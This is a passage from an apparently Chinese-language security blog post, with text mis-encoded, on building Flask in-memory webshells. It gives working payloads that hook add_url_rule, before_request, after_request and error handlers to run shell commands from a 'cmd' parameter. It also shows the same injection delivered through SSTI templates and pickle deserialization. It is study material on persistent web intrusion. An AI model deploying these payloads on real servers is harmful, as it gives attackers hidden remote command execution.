çš„ä¸€ä¸ªå˜åŒ–æ˜¯å¤„ç†æ–¹æ³•é€‰é¡¹ã€‚æ–¹æ³•æ˜¯æ­¤è§„åˆ™åº”é™åˆ¶çš„æ–¹æ³•åˆ—è¡¨ï¼ˆGETã€POSTç­‰ï¼‰ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè§„åˆ™åªä¾¦å¬ GETï¼ˆå¹¶éšå¼åœ°ä¾¦å¬HEADï¼‰</li></ul><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240809213643592.png" alt="image-20240809213643592"></p><p>å¯¹ç…§ä¸€ä¸‹payloadï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œæ·»åŠ äº†ä¸€æ¡è·¯ç”±ï¼Œå¤„ç†è¯¥è·¯ç”±çš„å‡½æ•°æ˜¯ä¸ªç”±lambdaå…³é”®å­—å®šä¹‰çš„åŒ¿åå‡½æ•°</p><hr><h2 id="è·å–appä¸Šä¸‹æ–‡"><a href="#è·å–appä¸Šä¸‹æ–‡" class="headerlink" title="è·å–appä¸Šä¸‹æ–‡"></a>è·å–appä¸Šä¸‹æ–‡</h2><h3 id="ä½ç‰ˆæœ¬ä¸­-request-ctx-stack"><a href="#ä½ç‰ˆæœ¬ä¸­-request-ctx-stack" class="headerlink" title="ä½ç‰ˆæœ¬ä¸­_request_ctx_stack"></a>ä½ç‰ˆæœ¬ä¸­_request_ctx_stack</h3><p><code>_request_ctx_stack</code>æ˜¯Flaskçš„ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ˜¯ä¸€ä¸ªLocalStackå®ä¾‹</p><blockquote><p>Flaskè¯·æ±‚ä¸Šä¸‹æ–‡ç®¡ç†æœºåˆ¶ï¼šå½“ä¸€ä¸ªè¯·æ±‚è¿›å…¥Flaskï¼Œé¦–å…ˆä¼šå®ä¾‹åŒ–ä¸€ä¸ªRequest Contextï¼Œè¿™ä¸ªä¸Šä¸‹æ–‡å°è£…äº†è¯·æ±‚çš„ä¿¡æ¯åœ¨Requestä¸­ï¼Œå¹¶å°†è¿™ä¸ªä¸Šä¸‹æ–‡æ¨å…¥åˆ°ä¸€ä¸ªåä¸º<code>_request_ctx_stack</code> çš„æ ˆç»“æ„ä¸­</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´è·å–å½“å‰çš„è¯·æ±‚ä¸Šä¸‹æ–‡ç­‰åŒäºè·å–<code>_request_ctx_stack</code>çš„æ ˆé¡¶å…ƒç´ <code>_request_ctx_stack.top</code>ï¼Œè¿™é‡Œç­‰ä»·äºè·å–äº†<code>&lt;Flask &#39;app&#39;&gt;</code></p><p>é‚£ä¹ˆ<code>_request_ctx_stack.top.request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code>å°±èƒ½è·å–cmdå‚æ•°</p><h3 id="sys-modules"><a href="#sys-modules" class="headerlink" title="sys.modules"></a>sys.modules</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/shell'</span><span class="token punctuation">,</span><span class="token string">'shell'</span><span class="token punctuation">,</span><span class="token keyword">lambda</span> <span class="token punctuation">:</span><span class="token builtin">__import__</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'dir'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h1 id="æ–°ç‰ˆå†…å­˜é©¬"><a href="#æ–°ç‰ˆå†…å­˜é©¬" class="headerlink" title="æ–°ç‰ˆå†…å­˜é©¬"></a>æ–°ç‰ˆå†…å­˜é©¬</h1><p>æµ‹è¯•ç‰ˆæœ¬ï¼šFlask 2.2.0</p><p>ä¸çŸ¥é“ä»å“ªä¸ªç‰ˆæœ¬å¼€å§‹ï¼Œflaskä¸å†æ”¯æŒåœ¨ç¨‹åºè¿è¡Œçš„è¿‡ç¨‹ä¸­é€šè¿‡<code>add_url_rule</code>æ·»åŠ è·¯ç”±</p><p>é‚£å°±å¾—å¦è¾Ÿè¹Šå¾„äº†</p><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>@app.before_request</code>æˆ–è€…<code>@app.after_request</code>è¿™ä¸¤ä¸ªåº•å±‚å‡½æ•°æ¥æ‰“</p><p>æ¥ä¸‹æ¥å…ˆä»¥ä¸‹é¢è¿™ä¸ªè·¯ç”±è¿›è¡Œæµ‹è¯•ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/e'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">e</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> a <span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"1"</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"0"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h2><blockquote><p>åœ¨ Flask ä¸­ï¼Œ<code>before_request</code> æ˜¯ä¸€ä¸ªè£…é¥°å™¨ï¼Œå®ƒç”¨äºåœ¨è¯·æ±‚å¤„ç†ä¹‹å‰æ‰§è¡Œç‰¹å®šçš„å‡½æ•°ã€‚è¿™ä¸ªè£…é¥°å™¨å…è®¸å¯¹æ¯ä¸ªè¯·æ±‚è¿›è¡Œä¸€äº›é¢„å¤„ç†ï¼Œæ¯”å¦‚è®¤è¯æ£€æŸ¥ã€æ—¥å¿—è®°å½•ã€è®¾ç½®å“åº”å¤´ç­‰</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> requestapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_request</span><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"Unauthorized"</span><span class="token punctuation">,</span> <span class="token number">401</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åƒä¸Šé¢è¿™ä¸ªdemoå°±æ˜¯æ£€æµ‹è¯·æ±‚ headers æœ‰æ—  Authorization å­—æ®µæ¥å®ç°èº«ä»½è®¤è¯</p><p>è·Ÿè¿›ä¸€ä¸‹è¿™ä¸ªè£…é¥°å™¨</p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810004201760.png" alt="image-20240810004201760"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå®é™…ä¸Šè°ƒç”¨çš„æ˜¯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">self<span class="token punctuation">.</span>before_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½œç”¨æ˜¯ï¼š</p><ul><li>æ£€æŸ¥ <code>self.before_request_funcs</code> å­—å…¸ä¸­æ˜¯å¦æœ‰ä¸€ä¸ªé”®ä¸º <code>None</code> çš„æ¡ç›®ã€‚</li><li>å¦‚æœæ²¡æœ‰ <code>None</code> é”®ï¼Œå°±åœ¨å­—å…¸ä¸­åˆ›å»ºå®ƒï¼Œå¹¶å°†å…¶å€¼è®¾ç½®ä¸ºä¸€ä¸ªç©ºåˆ—è¡¨ã€‚</li><li>ç„¶åï¼Œæ— è®º <code>None</code> é”®æ˜¯å¦å­˜åœ¨ï¼Œéƒ½å°†å‡½æ•° <code>f</code> æ·»åŠ åˆ°è¿™ä¸ªåˆ—è¡¨ä¸­ã€‚</li></ul><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810004555015.png" alt="image-20240810004555015"></p><p>é‚£ä¹ˆè¿™ä¸ª<code>f</code>å°±æ˜¯æˆ‘ä»¬æ·»åŠ çš„å‡½æ•°äº†ï¼Œäºæ˜¯æˆ‘ä»¬åŒæ ·å¯ä»¥è‡ªå®šä¹‰ä¸€ä¸ª lambda å‡½æ•°ï¼Œè¿™æ ·åœ¨æ¯æ¬¡å‘èµ·è¯·æ±‚å‰å°±éƒ½ä¼šè§¦å‘äº†</p><p>äºæ˜¯å¯ä»¥æ„é€ æˆ‘ä»¬çš„payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>before_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token string">"123"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810005710518.png" alt="image-20240810005710518"></p><p>ç¬¬ä¸€æ¬¡å†™å…¥è¿›å»ï¼Œä¹‹åæ‰€æœ‰çš„è®¿é—®è¯·æ±‚éƒ½ä¼šè¿”å›123</p><p>ä¸è¿‡å¼Šç«¯ä¹Ÿå¾ˆæ˜æ˜¾ï¼Œä½¿ç”¨lambdaå¿…ç„¶ä¼šå¾—åˆ°ä¸€ä¸ªè¿”å›å€¼ï¼Œé‚£ä¹ˆæœåŠ¡åç»­çš„æ“ä½œéƒ½æ— æ³•è¿›è¡Œï¼Œä¼šå½±å“åˆ°ä¸»æœºçš„æ­£å¸¸ä¸šåŠ¡</p><hr><h2 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h2><p>å’Œ before_request ç›¸åï¼Œ<code>after_request</code>ä¼šåœ¨è¯·æ±‚ç»“æŸå¾—åˆ°å“åº”åŒ…ä¹‹åè¿›è¡Œæ“ä½œ</p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810010120613.png" alt="image-20240810010120613"></p><p>å’Œå‰é¢é‚£ä¸ªä¸€æ ·ï¼Œå”¯ä¸€è¦æ³¨æ„çš„æ˜¯è¿™ä¸ªéœ€è¦å®šä¹‰ä¸€ä¸ªè¿”å›å€¼ï¼Œä¸ç„¶å°±ä¼šæŠ¥é”™</p><p>æ„é€ payloadï¼šï¼ˆæ³¨æ„ï¼Œåœ¨æœ¬äººçš„æµ‹è¯•ç‰ˆæœ¬ä¸Šéœ€è¦æå‰åœ¨ä»£ç ä¸­å¯¼å…¥å¯¹åº”çš„åŒ…æ‰å¯æ‰“å…¥payloadï¼‰</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">app<span class="token punctuation">.</span>after_request_funcs<span class="token punctuation">.</span>setdefault<span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token keyword">lambda</span> resp<span class="token punctuation">:</span> CmdResp <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">'global CmdResp;CmdResp=make_response(os.popen(request.args.get(\'cmd\')).read())'</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">None</span> <span class="token keyword">else</span> resp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å‡½æ•°çš„å†…å®¹ä¸ºï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">lambda</span> resp<span class="token punctuation">:</span> <span class="token comment"># ä¼ å…¥å‚æ•°</span>    CmdResp <span class="token keyword">if</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'cmd'</span><span class="token punctuation">)</span> <span class="token keyword">and</span>      <span class="token comment"># å¦‚æœè¯·æ±‚å‚æ•°å«æœ‰cmdåˆ™è¿”å›å‘½ä»¤æ‰§è¡Œç»“æœ</span>    <span class="token keyword">exec</span><span class="token punctuation">(</span>'        <span class="token keyword">global</span> CmdResp<span class="token punctuation">;</span>     <span class="token comment"># å®šä¹‰ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæ–¹ä¾¿è·å–</span>        CmdResp<span class="token operator">=</span>make_response<span class="token punctuation">(</span>os<span class="token punctuation">.</span>popen<span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span>\'cmd\'<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># åˆ›å»ºä¸€ä¸ªå“åº”å¯¹è±¡</span>    '<span class="token punctuation">)</span><span class="token operator">==</span><span class="token boolean">None</span>    <span class="token comment"># æ’çœŸ</span>    <span class="token keyword">else</span> resp<span class="token punctuation">)</span>  <span class="token comment"># å¦‚æœè¯·æ±‚å‚æ•°æ²¡æœ‰cmdåˆ™æ­£å¸¸è¿”å›</span><span class="token comment"># è¿™é‡Œçš„cmdå‚æ•°åå’ŒCmdRespå˜é‡åéƒ½æ˜¯å¯ä»¥æ”¹çš„ï¼Œæœ€å¥½æ”¹æˆæœåŠ¡ä¸­ä¸å­˜åœ¨çš„å˜é‡åä»¥å…å½±å“æ­£å¸¸ä¸šåŠ¡</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰“å…¥åå°±getshelläº†</p><hr><h2 id="å…¶å®ƒçš„é’©å­"><a href="#å…¶å®ƒçš„é’©å­" class="headerlink" title="å…¶å®ƒçš„é’©å­"></a>å…¶å®ƒçš„é’©å­</h2><p>éƒ½æ˜¯gxngxngxnå¸ˆå‚…æ‰¾åˆ°çš„ï¼Œtql</p><p><code>teardown_request</code>ï¼šè·Ÿå‰é¢<code>after_request</code>çš„ç±»ä¼¼ï¼Œpayloadä¹Ÿé€šç”¨ï¼Œæ”¹ä¸ªè°ƒç”¨çš„åº•å±‚å‡½æ•°åå°±è¡Œï¼Œä½†æ˜¯æ— å›æ˜¾ã€‚ã€‚</p><h3 id="error-handler-spec"><a href="#error-handler-spec" class="headerlink" title="error_handler_spec"></a>error_handler_spec</h3><blockquote><p>è¯¥å‡½æ•°ç”¨äºè‡ªå®šä¹‰404é¡µé¢çš„å›æ˜¾</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>errorhandler</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">errortest</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'error_handler(404)'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'404 Err0r'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810012504500.png" alt="image-20240810012504500"></p><p>è·Ÿè¿›è¿™ä¸ªè£…é¥°å™¨çš„åº•å±‚é€»è¾‘</p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810012603684.png" alt="image-20240810012603684"></p><p>å‘ç°çœ¼ç†Ÿçš„ä¸œè¥¿ï¼Œå½“ç„¶æŒ‰ç…§æ—§ç‰ˆå†…å­˜é©¬çš„æ–¹å¼ç›´æ¥è°ƒç”¨<code>register_error_handler</code>åŒæ ·æ˜¯ä¸è¡Œçš„</p><p>ä½†æ˜¯å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œä¼ å…¥<code>register_error_handler</code>çš„å‚æ•°æœ‰<code>code_or_exception</code>å’Œ<code>f</code></p><p><code>f</code>ä¾æ—§æ˜¯æˆ‘ä»¬å¯æ§çš„å‡½æ•°ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯è¦æ„é€ <code>code_or_exception</code>ä½¿å¾—<code>code</code>å’Œ<code>exc_class</code>ä¹Ÿå¯æ§ï¼Œåœ¨å‰é¢<code>code_or_exception</code>çš„å€¼ä¸º404</p><p>è·Ÿè¿›ä¸€ä¸‹<code>_get_exc_class_and_code</code></p><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810013648894.png" alt="image-20240810013648894"></p><p>é‚£è¿™è¿˜æ„é€ ä¸ªå•¥ï¼Œç›´æ¥<code>_get_exc_class_and_code(404)</code>ï¼Œè¿™æ ·å°±èƒ½è¿”å›å¸¸è§„çš„å˜é‡äº†</p><p>payloadï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810014235559.png" alt="image-20240810014235559"></p><hr><h2 id="sstiåˆ©ç”¨"><a href="#sstiåˆ©ç”¨" class="headerlink" title="sstiåˆ©ç”¨"></a>sstiåˆ©ç”¨</h2><p>è€ƒè™‘åˆ°ä¸Šä¸‹æ–‡æ²¡æœ‰å¯¼å…¥åŒ…çš„æƒ…å†µ</p><p>æ³¨ï¼šéƒ¨åˆ†flaskç‰ˆæœ¬ä¸‹æ— æ³•ä½¿ç”¨<code>url_for.__globals__[&#39;current_app&#39;]</code>æ¥è·å–appï¼Œå› æ­¤è¿™é‡Œæ”¹ç”¨<code>sys.modules</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/08/09/Flask%E5%86%85%E5%AD%98%E9%A9%AC/image-20240810011718358.png" alt="image-20240810011718358"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"exec(\"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()\")"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'request'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'request'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'app'</span><span class="token punctuation">:</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'sys'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>modules<span class="token punctuation">[</span><span class="token string">'__main__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">[</span><span class="token string">'app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h2 id="pickleåˆ©ç”¨"><a href="#pickleåˆ©ç”¨" class="headerlink" title="pickleåˆ©ç”¨"></a>pickleåˆ©ç”¨</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__(\"sys\").modules['__main__'].__dict__['app'].before_request_funcs.setdefault(None, []).append(lambda :__import__('os').popen(request.args.get('cmd')).read())"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"__import__('sys').modules['__main__'].__dict__['app'].after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get('cmd') and exec(\"global CmdResp;CmdResp=__import__(\'flask\').make_response(__import__(\'os\').popen(request.args.get(\'cmd\')).read())\")==None else resp)"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> pickle<span class="token keyword">import</span> base64<span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__reduce__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">exec</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token string">"global exc_class;global code;exc_class, code = app._get_exc_class_and_code(404);app.error_handler_spec[None][code][exc_class] = lambda a:__import__('os').popen(request.args.get('cmd')).read()"</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>a <span class="token operator">=</span> A<span class="token punctuation">(</span><span class="token punctuation">)</span>b <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;å¹´è½»äººå­¦çš„ç¬¬ä¸€ä¸ªå†…å­˜é©¬ï¼Œç«Ÿç„¶ä¸æ˜¯javaï¼ˆ&lt;/p&gt;
&lt;p&gt;çœ‹å¤§ä¼™å¥½åƒå‰å‡ ä¸ªæœˆéƒ½åœ¨ç ”ç©¶è¿™ä¸ªï¼Œå­¦ä¸€ä¸‹ï¼Œé¡ºå¸¦å¤å¥ä¸€ä¸‹ï¼Œå·²ç»æ‘¸äº†ä¸¤å‘¨ğŸŸäº†&lt;/p&gt;
&lt;p&gt;å‚è€ƒï¼š&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/iceyhexman/flask_memory_shell&quot;&gt;https://github.com/iceyhexman/flask_memory_shell&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/&quot;&gt;http://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/&quot;&gt;https://longlone.top/%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/14421&quot;&gt;https://xz.aliyun.com/t/14421&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/gxngxngxn/p/18181936&quot;&gt;https://www.cnblogs.com/gxngxngxn/p/18181936&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Web" scheme="http://c1oudfl0w0.github.io/blog/categories/Web/"/>
    
